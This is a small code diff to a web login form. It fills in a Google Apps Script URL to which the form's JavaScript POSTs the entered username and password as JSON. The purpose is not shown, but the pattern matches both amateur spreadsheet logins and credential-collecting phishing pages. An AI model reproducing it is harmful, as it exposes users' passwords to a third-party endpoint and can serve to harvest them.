@@ -47,7 +47,7 @@
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
-      fetch("YOUR_SCRIPT_URL", {
+      fetch("https://script.google.com/macros/s/AKfycbzP28UIak9EL1qIJ3RsVnru_OZHh05y-IosneR7bqJ9RngyLl9z9Gffc6pwF73ruOO3/exec", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ username, password })
